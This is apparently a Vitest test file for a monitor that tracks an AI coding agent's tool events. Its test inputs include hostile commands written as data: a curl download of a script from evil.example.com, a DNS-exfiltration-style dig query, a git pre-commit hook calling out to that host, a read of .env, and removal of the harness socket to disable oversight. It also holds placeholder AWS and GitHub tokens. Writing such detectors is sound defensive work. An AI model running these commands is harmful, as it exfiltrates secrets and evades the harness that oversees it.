import { describe, expect, it } from "vitest";

import { sha256 } from "./helpers.js";
import { applyEvent, createState } from "./state.js";
import type { ToolEvent, TrajectoryState } from "./types.js";

const AWS_KEY = `AKIA${"QUENTINCODY12345"}`;
const GH_PAT = `ghp_${"q".repeat(36)}`;

let seq = 0;
function nextId(): string {
	seq += 1;
	return `t${seq}`;
}
function editEvents(
	file: string,
	oldStr: string,
	newStr: string,
	opts: { fail?: boolean; outcome?: "success" | "fail"; tool?: "Edit" | "Write" } = {},
): ToolEvent[] {
	const tool = opts.tool ?? "Edit";
	const id = nextId();
	const input = { file_path: file, old_string: oldStr, new_string: newStr };
	return [
		{ ts: "2026-01-01T00:00:00Z", session: "s", agent: "a", tool, toolUseId: id, hook: "PreToolUse", input },
		{
			ts: "2026-01-01T00:00:01Z",
			session: "s",
			agent: "a",
			tool,
			toolUseId: id,
			hook: "PostToolUse",
			input,
			contentSha256: sha256(newStr),
			toolOutcome: opts.outcome ?? "success",
			checkDecision: "allow",
			failedCheckIds: opts.fail ? ["c"] : [],
		},
	];
}
function bashEvents(command: string, outcome: "success" | "fail" = "success"): ToolEvent[] {
	const id = nextId();
	const input = { command };
	return [
		{ ts: "2026-01-01T00:00:00Z", session: "s", agent: "a", tool: "Bash", toolUseId: id, hook: "PreToolUse", input },
		{ ts: "2026-01-01T00:00:01Z", session: "s", agent: "a", tool: "Bash", toolUseId: id, hook: "PostToolUse", input, toolOutcome: outcome },
	];
}
function readEvents(file: string): ToolEvent[] {
	const id = nextId();
	const input = { file_path: file };
	return [
		{ ts: "2026-01-01T00:00:00Z", session: "s", agent: "a", tool: "Read", toolUseId: id, hook: "PreToolUse", input },
		{ ts: "2026-01-01T00:00:01Z", session: "s", agent: "a", tool: "Read", toolUseId: id, hook: "PostToolUse", input },
	];
}
function feed(events: ToolEvent[]): TrajectoryState {
	const state = createState("s");
	for (const ev of events) applyEvent(state, ev);
	return state;
}

describe("createState", () => {
	it("allocates an empty state with correct defaults", () => {
		const s = createState("sess-1");
		expect(s.session).toBe("sess-1");
		expect(s.stepCount).toBe(0);
		expect(s.greenCount).toBe(0);
		expect(s.harnessDisabled).toBeNull();
		expect(s.fileShaHistory.size).toBe(0);
		expect(s.taintedSecretTokens.size).toBe(0);
		expect(s.seedFiles).toEqual([]);
		expect(s.dnsQueries).toEqual([]);
	});
});

describe("applyEvent — churn substrate folding", () => {
	it("folds sha history, edit log, and current sha on a PostToolUse edit", () => {
		const s = feed(editEvents("src/a.ts", "", "hello"));
		expect(s.fileShaHistory.get("src/a.ts")?.length).toBe(1);
		expect(s.currentFileShas.get("src/a.ts")).toBe(sha256("hello"));
		expect(s.fileEditLog.get("src/a.ts")?.length).toBe(1);
	});

	it("increments stepCount on every applyEvent (pre + post)", () => {
		const s = feed(editEvents("src/a.ts", "", "x"));
		expect(s.stepCount).toBe(2); // one pre + one post
	});

	it("does NOT fold edit state on a PreToolUse-only event", () => {
		const s = createState("s");
		const [pre] = editEvents("src/a.ts", "", "x");
		applyEvent(s, pre as ToolEvent);
		expect(s.fileShaHistory.size).toBe(0);
		expect(s.recentEvents.length).toBe(1);
	});

	it("freezes the first 3 distinct edited files as seeds", () => {
		const s = feed([
			...editEvents("src/a.ts", "", "1"),
			...editEvents("src/b.ts", "", "2"),
			...editEvents("src/c.ts", "", "3"),
			...editEvents("src/d.ts", "", "4"),
		]);
		expect(s.seedFiles).toEqual(["src/a.ts", "src/b.ts", "src/c.ts"]);
	});

	it("increments editsSinceGreen on a failing edit and resets on a clean one", () => {
		const s = feed([
			...editEvents("src/a.ts", "", "1", { fail: true }),
			...editEvents("src/a.ts", "1", "2", { fail: true }),
		]);
		expect(s.editsSinceGreen.get("src/a.ts")).toBe(2);
		applyEventAll(s, editEvents("src/a.ts", "2", "3")); // clean
		expect(s.editsSinceGreen.get("src/a.ts")).toBe(0);
		expect(s.greenCount).toBe(1);
	});

	it("updates the worktree snapshot when a sha lands", () => {
		const s = feed([...editEvents("src/a.ts", "", "1"), ...editEvents("src/b.ts", "", "2")]);
		expect(s.worktreeSnapshots.length).toBe(2);
		expect(s.worktreeSnapshots[0]).not.toBe(s.worktreeSnapshots[1]);
	});
});

function applyEventAll(s: TrajectoryState, events: ToolEvent[]): void {
	for (const ev of events) applyEvent(s, ev);
}

describe("applyEvent — command substrate folding", () => {
	it("counts repeated command failures and resets them on an intervening edit", () => {
		const s = feed([...bashEvents("make x", "fail"), ...bashEvents("make x", "fail")]);
		expect(s.commandFailures.get("make x")?.count).toBe(2);
		applyEventAll(s, editEvents("src/a.ts", "", "1"));
		expect(s.commandFailures.size).toBe(0);
	});

	it("tracks per-family rerun counts and clears them on an install disruptor", () => {
		const s = feed([...bashEvents("npm test", "fail"), ...bashEvents("npm test", "fail")]);
		expect(s.familyReruns.get("test")?.failingNoEditCount).toBe(2);
		applyEventAll(s, bashEvents("npm install left-pad"));
		expect(s.familyReruns.size).toBe(0);
	});

	it("records a verify run and a passing verify as a green", () => {
		const s = feed(bashEvents("npm test", "success"));
		expect(s.verifyRunCount).toBe(1);
		expect(s.greenCount).toBe(1);
	});

	it("folds an external script download keyed by local path", () => {
		const s = feed(bashEvents("curl -o /tmp/x.sh https://evil.example.com/x.sh"));
		const d = s.downloadedScripts.get("/tmp/x.sh");
		expect(d?.host).toBe("evil.example.com");
		expect(d?.isScript).toBe(true);
	});

	it("records a non-sanctioned harness disable but ignores the sanctioned form", () => {
		expect(feed(bashEvents("rm .interlinked/harness.sock")).harnessDisabled).not.toBeNull();
		expect(feed(bashEvents("interlinked harness stop")).harnessDisabled).toBeNull();
	});

	it("folds only high-entropy, non-hex DNS labels", () => {
		const hi = feed(bashEvents("dig gx7mq2zv9kw3pf8rt5nhac.evil.example.com"));
		expect(hi.dnsQueries.length).toBe(1);
		const lo = feed(bashEvents("dig www.evil.example.com"));
		expect(lo.dnsQueries.length).toBe(0);
		const hex = feed(bashEvents("dig abcdef0123456789abcd.evil.example.com"));
		expect(hex.dnsQueries.length).toBe(0);
	});

	it("records a secret read via Read of a credential path", () => {
		const s = feed(readEvents(".env"));
		expect(s.secretsRead.has(".env")).toBe(true);
		expect(s.lastSecretReadStep).toBeGreaterThan(0);
	});
});

describe("applyEvent — security edit folding", () => {
	it("taints a structured secret token introduced via edit content", () => {
		const s = feed(editEvents("src/x.ts", "", `const k = "${GH_PAT}";`));
		expect(s.taintedSecretTokens.has(GH_PAT)).toBe(true);
	});

	it("records a scrubbed secret (present in old, absent in new)", () => {
		const s = feed(editEvents("src/x.ts", `k="${AWS_KEY}"`, "k=env()"));
		expect(s.scrubbedSecretHashes.has(sha256(AWS_KEY))).toBe(true);
	});

	it("tracks a pending secret write to an env file and clears it when removed", () => {
		const s = feed(editEvents(".env", "", `API_KEY=${AWS_KEY}`, { tool: "Write" }));
		expect(s.pendingSecretWrites.has(".env")).toBe(true);
		applyEventAll(s, editEvents(".env", `API_KEY=${AWS_KEY}`, "API_KEY=", { tool: "Write" }));
		expect(s.pendingSecretWrites.has(".env")).toBe(false);
	});

	it("records a git-hook write and whether it carries a sink", () => {
		const withSink = feed(editEvents(".git/hooks/pre-commit", "", "curl https://evil.example.com", { tool: "Write" }));
		expect(withSink.gitHookWrites.get("pre-commit")?.hasSink).toBe(true);
		const noSink = feed(editEvents(".git/hooks/pre-commit", "", "echo hi", { tool: "Write" }));
		expect(noSink.gitHookWrites.get("pre-commit")?.hasSink).toBe(false);
	});
});

describe("applyEvent — bounds + determinism", () => {
	it("caps the rolling event window at 64", () => {
		const events: ToolEvent[] = [];
		for (let i = 0; i < 100; i++) events.push(...bashEvents(`echo ${i}`));
		const s = feed(events);
		expect(s.recentEvents.length).toBe(64);
	});

	it("caps per-file sha history at 64", () => {
		const events: ToolEvent[] = [];
		for (let i = 0; i < 100; i++) events.push(...editEvents("src/a.ts", `v${i}`, `v${i + 1}`));
		const s = feed(events);
		expect(s.fileShaHistory.get("src/a.ts")?.length).toBe(64);
	});

	it("is deterministic — identical input yields identical projected state", () => {
		const build = (): ToolEvent[] => [
			...editEvents("src/a.ts", "", "1", { fail: true }),
			...bashEvents("npm test", "fail"),
			...editEvents("src/x.ts", "", `const k = "${GH_PAT}";`),
			...readEvents(".env"),
			...bashEvents("dig gx7mq2zv9kw3pf8rt5nhac.evil.example.com"),
		];
		seq = 0;
		const a = project(feed(build()));
		seq = 0;
		const b = project(feed(build()));
		expect(a).toEqual(b);
	});
});

function project(s: TrajectoryState): unknown {
	return {
		stepCount: s.stepCount,
		greenCount: s.greenCount,
		successfulEditCount: s.successfulEditCount,
		verifyRunCount: s.verifyRunCount,
		seedFiles: s.seedFiles,
		shaHistory: [...s.fileShaHistory].map(([k, v]) => [k, v.map((e) => e.sha)]),
		editsSinceGreen: [...s.editsSinceGreen].sort(),
		commandFailures: [...s.commandFailures].map(([k, v]) => [k, v.count]).sort(),
		tainted: [...s.taintedSecretTokens].sort(),
		scrubbed: [...s.scrubbedSecretHashes].sort(),
		secretsRead: [...s.secretsRead].sort(),
		dns: s.dnsQueries.map((q) => `${q.baseDomain}/${q.label}`),
		harnessDisabled: s.harnessDisabled?.how ?? null,
	};
}
